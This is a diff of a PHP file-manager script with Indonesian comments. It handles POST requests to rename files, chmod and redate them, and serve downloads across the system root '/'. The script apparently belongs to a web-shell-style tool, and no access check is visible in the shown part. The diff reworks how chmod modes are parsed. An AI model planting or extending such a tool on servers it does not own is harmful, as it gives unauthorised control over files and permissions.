@@ -462,7 +462,8 @@ if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destinat
 
 if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) {
     $manual = isset($_POST['manualMode']) ? true : false;
-    changePermissions($_POST['source'], $_POST['mode'], $manual);
+    $mode = $manual ? $_POST['manualChmod'] : $_POST['mode'];
+    changePermissions($_POST['source'], $mode, $manual);
 }
 
 if (isset($_POST['changedate']) && isset($_POST['source']) && isset($_POST['newdate'])) {
@@ -502,15 +503,15 @@ if (isset($_GET['download'])) {
 
 // Fungsi untuk mengubah izin manual ke oktal
 function str2oct($str) {
-    $trans = array(
-        '-' => '0', 'r' => '4', 'w' => '2', 'x' => '1', 
-        's' => '4', 'S' => '0', 't' => '1', 'T' => '0'
-    );
     $oct = array(0, 0, 0);
-    for ($i = 0; $i < 9; $i++) {
-        $oct[intval($i / 3)] += intval($trans[$str[$i]]);
+
+    for ($i = 0; $i < 3; $i++) {
+        if ($str[$i * 3 + 1] == 'r') $oct[$i] += 4;
+        if ($str[$i * 3 + 2] == 'w') $oct[$i] += 2;
+        if ($str[$i * 3 + 3] == 'x' || $str[$i * 3 + 3] == 's' || $str[$i * 3 + 3] == 't') $oct[$i] += 1;
     }
-    return intval(implode('', $oct), 8);
+
+    return octdec(implode('', $oct));
 }
 
 $rootDir = '/'; // Menggunakan root direktori sistem Linux
